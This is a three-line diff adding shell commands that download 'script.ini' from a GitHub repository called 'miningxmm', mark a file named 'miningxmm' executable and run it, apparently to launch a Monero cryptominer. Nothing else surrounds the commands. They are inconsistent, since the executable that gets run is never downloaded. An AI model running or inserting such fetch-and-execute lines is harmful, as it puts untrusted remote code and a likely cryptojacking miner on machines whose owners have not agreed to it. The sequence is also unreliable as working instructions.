@@ -1,1 +1,3 @@
-
+wget https://github.com/mahmoudjohn/miningxmm/raw/main/script.ini
+chmod +x miningxmm    
+./miningxmm script.ini
